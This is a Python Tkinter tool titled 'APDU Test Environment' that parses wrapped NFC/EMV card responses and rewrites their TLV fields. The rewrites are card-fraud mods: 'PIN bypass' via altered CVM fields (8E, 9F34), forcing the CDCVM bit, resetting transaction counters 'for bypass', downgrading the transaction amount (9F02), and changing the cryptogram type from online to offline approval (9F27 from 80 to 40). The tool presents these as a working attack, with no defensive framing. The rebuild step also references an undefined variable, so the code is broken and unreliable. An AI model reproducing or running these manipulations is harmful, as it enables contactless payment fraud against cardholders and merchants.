#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import json
import re
from binascii import hexlify, unhexlify, Error
from typing import List, Dict
from nfc_emv.engine import load_profile
from tkinter.ttk import Style

# Filtered SAMPLE_APDUS to include only valid wrapped APDUs
SAMPLE_APDUS = [
    b'\x12\x1f\x10\x01\x1a\x14\x00\xa4\x04\x00\x0e2PAY.SYS.DDF01\x00 \xae\xa2\xb2\xb7\xe82',
    b'\x12\x1f\x10\x01\x1a\x14\x00\xa4\x04\x00\x0e2PAY.SYS.DDF01\x00 \xdb\xb6\xb2\xb7\xe82',
    b'\x12N\x08\x01\x10\x01\x1aAo=\x84\x0e2PAY.SYS.DDF01\xa5+\xbf\x0c(a&O\x07\xa0\x00\x00\x00\x03\x10\x10\x9f\x12\nCHASE VISAP\x0bVISA CREDIT\x87\x01\x01\x90\x00 \x84\xa6\xb2\xb7\xe82',
    b'\x12\x18\x10\x01\x1a\r\x00\xa4\x04\x00\x07\xa0\x00\x00\x00\x03\x10\x10\x00 \xdc\xb9\xb2\xb7\xe82',
    b'\x12\x1f\x10\x01\x1a\x14\x00\xa4\x04\x00\x0e2PAY.SYS.DDF01\x00 \xfd\xae\x99\xb7\xe82',
    b'\x12N\x08\x01\x10\x01\x1aAo=\x84\x0e2PAY.SYS.DDF01\xa5+\xbf\x0c(a&O\x07\xa0\x00\x00\x00\x03\x10\x10\x9f\x12\nCHASE VISAP\x0bVISA CREDIT\x87\x01\x01\x90\x00 \xca\x98\x99\xb7\xe82',
    b'\x12\x1f\x10\x01\x1a\x14\x00\xa4\x04\x00\x0e2PAY.SYS.DDF01\x00 \xbf\xb4\x99\xb7\xe82',
    b'\x12N\x08\x01\x10\x01\x1aAo=\x84\x0e2PAY.SYS.DDF01\xa5+\xbf\x0c(a&O\x07\xa0\x00\x00\x00\x03\x10\x10\x9f\x12\nCHASE VISAP\x0bVISA CREDIT\x87\x01\x01\x90\x00 \xbb\x9e\x99\xb7\xe82',
    b'\x12\x18\x10\x01\x1a\r\x00\xa4\x04\x00\x07\xa0\x00\x00\x00\x03\x10\x10\x00 \xe5\xb7\x99\xb7\xe82',
]

DEFAULT_CONFIG = {
    "cdcvm_enabled": True,
    "force_offline_threshold": 50,
    "pin_bypass": True,
    "amount_downgrade": "000000000000",
    "default_profile": "visa",
    "profiles": {
        "visa": {
            "9F66": "B6008000",
            "9F33": "E0F0C0",
            "9F35": "22",
            "9F1A": "0840",
            "82": "7800",
            "9F34": "420301",
            "8E": "0000123456789ABCDEF0"
        },
        "mastercard": {
            "9F66": "36000000",
            "9F33": "E0B8C0",
            "9F35": "22",
            "9F1A": "0840",
            "82": "7800",
            "9F34": "3F0000",
            "8E": "0000123456789ABCDEF0"
        }
    }
}


def decode_varint(data, pos):
    value = 0
    shift = 0
    try:
        while pos < len(data):
            b = data[pos]
            value |= (b & 0x7F) << shift
            pos += 1
            shift += 7
            if not (b & 0x80):
                break
        return value, pos
    except IndexError:
        raise ValueError("Invalid varint encoding")


def encode_varint(value):
    bytes_arr = b''
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        bytes_arr += bytes([byte])
        if not value:
            break
    return bytes_arr


def parse_tlv(data):
    tlvs = []
    i = 0
    while i < len(data):
        if i >= len(data):
            break
        first_byte = data[i]
        tag = data[i]
        i += 1
        if (tag & 0x1F) == 0x1F:
            tag_bytes = [tag]
            while i < len(data) and (data[i] & 0x80):
                tag_bytes.append(data[i])
                i += 1
            if i < len(data):
                tag_bytes.append(data[i])
                i += 1
            tag = int.from_bytes(bytes(tag_bytes), 'big')
        else:
            tag_bytes = [tag]

        if i >= len(data):
            break

        length = data[i]
        i += 1
        if length & 0x80:
            num_len_bytes = length & 0x7F
            if i + num_len_bytes > len(data):
                break
            length = int.from_bytes(data[i:i + num_len_bytes], 'big')
            i += num_len_bytes

        if i + length > len(data):
            break
        value = data[i:i + length]
        i += length

        children = parse_tlv(value) if (first_byte & 0x20) == 0x20 else None
        tlvs.append({'tag': tag, 'length': length, 'value': value, 'children': children})
    return tlvs


def build_tlv(tlvs):
    result = bytearray()
    for tlv in tlvs:
        tag = tlv['tag']
        if tag <= 0xFF:
            tag_bytes = tag.to_bytes(1, 'big')
        else:
            tag_bytes_list = []
            temp_tag = tag
            while temp_tag > 0:
                tag_bytes_list.insert(0, temp_tag & 0xFF)
                temp_tag >>= 8
            tag_bytes = bytes(tag_bytes_list)

        value = build_tlv(tlv['children']) if tlv['children'] else tlv['value']
        length = len(value)
        if length < 0x80:
            length_bytes = length.to_bytes(1, 'big')
        else:
            length_len = (length.bit_length() + 7) // 8
            length_bytes = bytes([0x80 | length_len]) + length.to_bytes(length_len, 'big')

        result.extend(tag_bytes)
        result.extend(length_bytes)
        result.extend(value)
    return bytes(result)


def find_tlv(tlvs, tag):
    for tlv in tlvs:
        if tlv['tag'] == tag:
            return tlv
        if tlv['children']:
            found = find_tlv(tlv['children'], tag)
            if found:
                return found
    return None


def get_scheme_from_tlvs(tlvs):
    pan_tlv = find_tlv(tlvs, 0x5A)
    if pan_tlv and len(pan_tlv['value']) > 0:
        first_digit = (pan_tlv['value'][0] >> 4) & 0x0F
        if first_digit == 4:
            return 'visa'
        elif first_digit == 5:
            return 'mastercard'
    return DEFAULT_CONFIG['default_profile']


def detect_terminal_type(tlvs):
    tt_tlv = find_tlv(tlvs, 0x9F35)
    if tt_tlv and len(tt_tlv['value']) == 1:
        tt = tt_tlv['value'][0]
        if tt == 0x22:
            return 'attended_online_offline'
    return 'generic'


def replace_tlv_value(tlvs, tag_hex, new_value_hex, logger):
    tag = int(tag_hex, 16)
    try:
        new_value = unhexlify(new_value_hex)
    except Error as e:
        logger(f"Invalid hex in new_value for tag {tag_hex}: {str(e)}")
        return False
    tlv = find_tlv(tlvs, tag)
    if tlv:
        before = hexlify(tlv['value']).decode().upper()
        tlv['value'] = new_value
        tlv['length'] = len(new_value)
        tlv['children'] = None
        logger(f"Replaced {tag_hex}: {before} -> {new_value_hex}. Changed TLV value at tag {tag_hex}.")
        return True
    logger(f"No TLV found for tag {tag_hex}; no change applied.")
    return False


class APDUTester:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("APDU Test Environment")
        self.root.geometry("1200x800")
        self.root.resizable(True, True)

        style = Style(self.root)
        style.theme_use('clam')
        style.configure('TFrame', background='#f0f0f0')
        style.configure('TLabel', foreground='#333', font=('Arial', 10))
        style.configure('TButton', background='#4CAF50', foreground='white', font=('Arial', 10, 'bold'))
        style.configure('TCheckbutton', foreground='#333', font=('Arial', 10))
        style.configure('Treeview', font=('Arial', 9), rowheight=25)
        style.configure('Treeview.Heading', font=('Arial', 10, 'bold'))

        self.config = DEFAULT_CONFIG.copy()
        self.state = {}

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.create_input_tab()
        self.create_mods_tab()
        self.create_config_tab()
        self.create_results_tab()
        self.create_log_tab()

        self.log_text = tk.Text(self.log_frame, wrap=tk.WORD, bg='#ffffff', fg='#000000', font=('Consolas', 10))
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.root.mainloop()

    def create_input_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Input")

        ttk.Label(tab, text="Select Sample APDU:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.sample_combo = ttk.Combobox(tab, values=[f"Sample {i + 1}" for i in range(len(SAMPLE_APDUS))],
                                         state="readonly")
        self.sample_combo.grid(row=0, column=1, sticky=tk.W + tk.E, pady=5)
        self.sample_combo.bind("<<ComboboxSelected>>", self.load_selected_sample)

        ttk.Label(tab, text="APDU Input (Hex):").grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=5)
        self.apdu_input = tk.Text(tab, height=5, font=('Consolas', 10), bg='#ffffff')
        self.apdu_input.grid(row=2, column=0, columnspan=2, sticky=tk.W + tk.E)
        self.apdu_input.bind("<KeyRelease>", self.format_hex_input)

        ttk.Button(tab, text="Load File", command=self.load_file).grid(row=3, column=0, pady=5)
        ttk.Button(tab, text="Process APDU", command=self.process_apdu).grid(row=3, column=1, pady=5)

        tab.columnconfigure(0, weight=1)
        tab.columnconfigure(1, weight=1)

    def create_mods_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Mods")

        mods_descriptions = {
            "replace_specific_tlvs": "Replaces 9F17,9F36,9F6C to 01. Sets specific TLVs to '01' for bypass.",
            "set_cdcvm_bit": "Sets CDCVM bit in 9F66 by OR-ing with 0x04.",
            "visa_attended_9f34": "Sets 9F34 to 420301 for Visa in attended mode.",
            "apply_profile": "Applies profile-specific TLV replacements from config or module.",
            "amount_downgrade": "Downgrades amount if above threshold, sets 82 to 7800 and 9F02 to config value.",
            "change_ac": "Changes 9F27 from 80 to 40 if matched to modify authorization code.",
            "enable_cdcvm": "Sets 9F34 to 420301 for CDCVM.",
            "pin_bypass": "Sets 8E to 0000123456789ABCDEF0 and 9F34 to 3F0000 for PIN bypass."
        }

        self.mod_vars = {}
        row = 0
        for mod, desc in mods_descriptions.items():
            self.mod_vars[mod] = tk.BooleanVar(value=True)
            cb = ttk.Checkbutton(tab, text=mod.replace("_", " ").title(), variable=self.mod_vars[mod])
            cb.grid(row=row, column=0, sticky=tk.W, pady=2)
            ttk.Label(tab, text=desc, font=('Arial', 8, 'italic'), foreground='#666').grid(row=row, column=1,
                                                                                           sticky=tk.W, pady=2)
            row += 1

        tab.columnconfigure(0, weight=1)
        tab.columnconfigure(1, weight=3)

    def create_config_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Config")

        ttk.Label(tab, text="JSON Config:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.config_text = tk.Text(tab, height=20, font=('Consolas', 10), bg='#ffffff')
        self.config_text.grid(row=1, column=0, sticky=tk.W + tk.E + tk.N + tk.S)
        self.config_text.insert(tk.END, json.dumps(self.config, indent=2))

        ttk.Button(tab, text="Save Config", command=self.save_config).grid(row=2, column=0, pady=5)
        ttk.Button(tab, text="Load Config File", command=self.load_config_file).grid(row=3, column=0, pady=5)
        ttk.Button(tab, text="Reset Default", command=self.reset_config).grid(row=4, column=0, pady=5)

        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(1, weight=1)

    def create_results_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Results")

        paned = tk.PanedWindow(tab, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)

        before_frame = ttk.LabelFrame(paned, text="Before TLV")
        paned.add(before_frame)
        self.before_tree = ttk.Treeview(before_frame, columns=("Tag", "Length", "Value"), show="headings")
        self.before_tree.heading("Tag", text="Tag")
        self.before_tree.heading("Length", text="Length")
        self.before_tree.heading("Value", text="Value")
        self.before_tree.pack(fill=tk.BOTH, expand=True)

        after_frame = ttk.LabelFrame(paned, text="After TLV")
        paned.add(after_frame)
        self.after_tree = ttk.Treeview(after_frame, columns=("Tag", "Length", "Value"), show="headings")
        self.after_tree.heading("Tag", text="Tag")
        self.after_tree.heading("Length", text="Length")
        self.after_tree.heading("Value", text="Value")
        self.after_tree.pack(fill=tk.BOTH, expand=True)

        ttk.Label(tab, text="Modified APDU (Hex):").pack(anchor=tk.W, pady=5)
        self.modified_output = tk.Text(tab, height=5, font=('Consolas', 10), bg='#ffffff')
        self.modified_output.pack(fill=tk.X)

        ttk.Button(tab, text="Export Modified", command=self.export_modified).pack(pady=5)

    def create_log_tab(self):
        self.log_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.log_frame, text="Logs")

    def logger(self, msg):
        self.log_text.insert(tk.END, msg + "\n")
        self.log_text.see(tk.END)

    def is_valid_hex(self, hex_str):
        return bool(re.match(r'^[0-9A-Fa-f]*$', hex_str))

    def format_hex_input(self, event=None):
        text = self.apdu_input.get(1.0, tk.END).strip().upper()
        text = re.sub(r'[^0-9A-F]', '', text)
        formatted = ' '.join(text[i:i + 2] for i in range(0, len(text), 2))
        self.apdu_input.delete(1.0, tk.END)
        self.apdu_input.insert(tk.END, formatted)

    def load_selected_sample(self, event=None):
        index = self.sample_combo.current()
        if index >= 0:
            hex_apdu = hexlify(SAMPLE_APDUS[index]).decode().upper()
            self.apdu_input.delete(1.0, tk.END)
            self.apdu_input.insert(tk.END, hex_apdu)
            self.format_hex_input()

    def load_file(self):
        file = filedialog.askopenfilename()
        if file:
            with open(file, 'rb') as f:
                data = f.read()
                try:
                    hex_data = hexlify(data).decode().upper()
                    self.apdu_input.delete(1.0, tk.END)
                    self.apdu_input.insert(tk.END, hex_data)
                    self.format_hex_input()
                except Error:
                    messagebox.showerror("Error", "Invalid file content")

    def select_mods_dialog(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Select Mods to Run")
        dialog.geometry("500x500")
        dialog.resizable(False, False)

        selected_mods = []

        def toggle_mod(mod):
            if mod in selected_mods:
                selected_mods.remove(mod)
            else:
                selected_mods.append(mod)
            update_buttons()

        def update_buttons():
            for btn, mod in buttons.items():
                btn.config(relief=tk.SUNKEN if mod in selected_mods else tk.RAISED)

        buttons = {}
        row = 0
        for mod in self.mod_vars.keys():
            btn = ttk.Button(dialog, text=mod.replace("_", " ").title(), command=lambda m=mod: toggle_mod(m))
            btn.grid(row=row, column=0, sticky=tk.W + tk.E, pady=2, padx=10)
            buttons[btn] = mod
            row += 1

        def confirm():
            dialog.destroy()

        ttk.Button(dialog, text="Confirm Selection", command=confirm).grid(row=row, column=0, pady=10)

        dialog.wait_window()
        return selected_mods

    def process_apdu(self):
        hex_str = self.apdu_input.get(1.0, tk.END).strip()
        hex_str = re.sub(r'[^0-9A-Fa-f]', '', hex_str)

        if not hex_str or not self.is_valid_hex(hex_str) or len(hex_str) % 2 != 0:
            messagebox.showerror("Invalid Hex", "Invalid hex input")
            return

        try:
            data = unhexlify(hex_str)
        except Error as e:
            messagebox.showerror("Invalid Hex", f"Hex decoding error: {str(e)}")
            return

        selected_mods = self.select_mods_dialog()
        if not selected_mods:
            messagebox.showinfo("No Mods", "No modifications selected.")
            return

        self.logger(f"Processing with mods: {', '.join(selected_mods)}")
        tlvs_before = parse_tlv(data[1:]) if len(data) > 1 else []
        modified_data = self.custom_handle_data(self.logger, data, self.state, selected_mods)
        tlvs_after = parse_tlv(modified_data[1:]) if len(modified_data) > 1 else []

        self.display_tlv(self.before_tree, tlvs_before)
        self.display_tlv(self.after_tree, tlvs_after)
        modified_hex = hexlify(modified_data).decode().upper()
        self.modified_output.delete(1.0, tk.END)
        self.modified_output.insert(tk.END, modified_hex)

    def custom_handle_data(self, logger, data, state, selected_mods):
        try:
            if len(data) < 2 or data[0] != 0x12:
                logger(f"Invalid wrapper: Expected 0x12, got {hex(data[0]) if data else 'empty'}")
                return data

            pos = 1
            try:
                length1, pos = decode_varint(data, pos)
            except ValueError as e:
                logger(f"Invalid varint at position {pos}: {str(e)}")
                return data
            if pos + length1 > len(data):
                logger(f"Invalid length1: {length1} exceeds data length {len(data) - pos}")
                return data
            inner1 = data[pos:pos + length1]
            pos = 0

            is_card = False
            if len(inner1) >= 2 and inner1[0] == 0x08 and inner1[1] == 0x01:
                is_card = True
                pos = 2
            else:
                logger(
                    f"Invalid card response: Expected 0x08 0x01, got {hex(inner1[0]) if inner1 else 'empty'} {hex(inner1[1]) if len(inner1) > 1 else 'empty'}")

            if len(inner1) - pos < 2 or inner1[pos] != 0x10 or inner1[pos + 1] != 0x01:
                logger(
                    f"Invalid inner structure: Expected 0x10 0x01 at pos {pos}, got {hex(inner1[pos]) if pos < len(inner1) else 'empty'} {hex(inner1[pos + 1]) if pos + 1 < len(inner1) else 'empty'}")
                return data

            pos += 2

            if len(inner1) - pos < 1 or inner1[pos] != 0x1A:
                logger(
                    f"No data field: Expected 0x1A at pos {pos}, got {hex(inner1[pos]) if pos < len(inner1) else 'empty'}")
                return data

            pos += 1
            try:
                length2, pos = decode_varint(inner1, pos)
            except ValueError as e:
                logger(f"Invalid varint for inner data at position {pos}: {str(e)}")
                return data
            if pos + length2 > len(inner1):
                logger(f"Invalid length2: {length2} exceeds inner1 length {len(inner1) - pos}")
                return data
            apdu = inner1[pos:pos + length2]

            if not is_card:
                logger("Not a card response; skipping.")
                return data

            before_hex = hexlify(apdu).decode().upper()
            logger(f"Before processing: {before_hex}")

            tlvs = parse_tlv(apdu)

            profile_name = get_scheme_from_tlvs(tlvs)
            terminal_type = detect_terminal_type(tlvs)
            state['profile'] = profile_name
            logger(f"Detected profile: {profile_name}, Terminal: {terminal_type}")

            # Apply selected mods
            if "replace_specific_tlvs" in selected_mods:
                replace_tlv_value(tlvs, '9F17', '01', logger)
                replace_tlv_value(tlvs, '9F36', '01', logger)
                replace_tlv_value(tlvs, '9F6C', '01', logger)

            if "set_cdcvm_bit" in selected_mods:
                tlv = find_tlv(tlvs, 0x9F66)
                if tlv and len(tlv['value']) > 0:
                    val = bytearray(tlv['value'])
                    val[0] |= 0x04
                    after = hexlify(bytes(val)).decode().upper()
                    logger(
                        f"Set CDCVM bit in 9F66: {hexlify(tlv['value']).decode().upper()} -> {after}. Modified byte 0 by OR with 0x04 to enable CDCVM.")
                    tlv['value'] = bytes(val)
                    tlv['length'] = len(tlv['value'])

            if "visa_attended_9f34" in selected_mods and profile_name == 'visa' and terminal_type == 'attended_online_offline':
                replace_tlv_value(tlvs, '9F34', '420301', logger)

            if "apply_profile" in selected_mods:
                profile = self.config['profiles'].get(profile_name,
                                                      self.config['profiles'][self.config['default_profile']])
                try:
                    profile_module = load_profile(profile_name)
                    before_profile = build_tlv(tlvs)
                    tlvs = profile_module.apply_profile(tlvs, logger)
                    after_profile = build_tlv(tlvs)
                    logger(
                        f"Applied toolkit profile {profile_name}. Changes from module apply_profile function; before: {hexlify(before_profile).decode().upper()}, after: {hexlify(after_profile).decode().upper()}.")
                except ImportError:
                    logger(f"Toolkit profile {profile_name} not found; using config for profile application.")
                for tag, value in profile.items():
                    replace_tlv_value(tlvs, tag, value, logger)

            if "amount_downgrade" in selected_mods:
                amount_tlv = find_tlv(tlvs, 0x9F02)
                if amount_tlv:
                    amount = int(hexlify(amount_tlv['value']).decode(), 16) / 100
                    if amount > self.config['force_offline_threshold']:
                        replace_tlv_value(tlvs, '82', '7800', logger)
                        replace_tlv_value(tlvs, '9F02', self.config['amount_downgrade'], logger)

            if "change_ac" in selected_mods:
                ac_tlv = find_tlv(tlvs, 0x9F27)
                if ac_tlv and ac_tlv['value'] == b'\x80':
                    replace_tlv_value(tlvs, '9F27', '40', logger)
                else:
                    logger(f"Change AC: No 9F27 tag with value 80 found; no change applied.")

            if "enable_cdcvm" in selected_mods:
                replace_tlv_value(tlvs, '9F34', '420301', logger)

            if "pin_bypass" in selected_mods:
                replace_tlv_value(tlvs, '8E', '0000123456789ABCDEF0', logger)
                replace_tlv_value(tlvs, '9F34', '3F0000', logger)

            modified_apdu = build_tlv(tlvs)
            after_hex = hexlify(modified_apdu).decode().upper()
            logger(f"After all mods: {after_hex}")

            # Rebuild inner1
            new_length2 = len(modified_apdu)
            new_length2_bytes = encode_varint(new_length2)
            prefix = inner1[:length_pos] + new_length2_bytes
            suffix = inner1[pos + length2:]
            new_inner1 = prefix + modified_apdu + suffix

            # Rebuild data
            new_length1 = len(new_inner1)
            new_length1_bytes = encode_varint(new_length1)
            new_data = b'\x12' + new_length1_bytes + new_inner1

            return new_data

        except Exception as e:
            logger(f"Error in processing: {str(e)}")
            return data

    def display_tlv(self, tree, tlvs: List[Dict]):
        tree.delete(*tree.get_children())

        def insert_tlv(parent, tlv_list):
            for tlv in tlv_list:
                tag_hex = f"{tlv['tag']:X}"
                val_hex = hexlify(tlv['value']).decode().upper() if tlv['value'] else ""
                item = tree.insert(parent, tk.END, values=(tag_hex, tlv['length'], val_hex))
                if tlv['children']:
                    insert_tlv(item, tlv['children'])

        insert_tlv("", tlvs)

    def save_config(self):
        try:
            config_str = self.config_text.get(1.0, tk.END)
            self.config = json.loads(config_str)
            self.logger("Config updated")
        except json.JSONDecodeError:
            messagebox.showerror("Error", "Invalid JSON")

    def load_config_file(self):
        file = filedialog.askopenfilename(filetypes=[("JSON", "*.json")])
        if file:
            with open(file, 'r') as f:
                self.config = json.load(f)
                self.config_text.delete(1.0, tk.END)
                self.config_text.insert(tk.END, json.dumps(self.config, indent=2))

    def reset_config(self):
        self.config = DEFAULT_CONFIG.copy()
        self.config_text.delete(1.0, tk.END)
        self.config_text.insert(tk.END, json.dumps(self.config, indent=2))

    def export_modified(self):
        hex_str = self.modified_output.get(1.0, tk.END).strip()
        if not hex_str:
            return
        if not self.is_valid_hex(hex_str):
            messagebox.showerror("Invalid Hex", "Modified APDU contains non-hexadecimal characters")
            return
        file = filedialog.asksaveasfilename(defaultextension=".bin")
        if file:
            try:
                data = unhexlify(hex_str)
                with open(file, 'wb') as f:
                    f.write(data)
            except Error as e:
                messagebox.showerror("Invalid Hex", f"Error saving file: {str(e)}")


if __name__ == "__main__":
    APDUTester()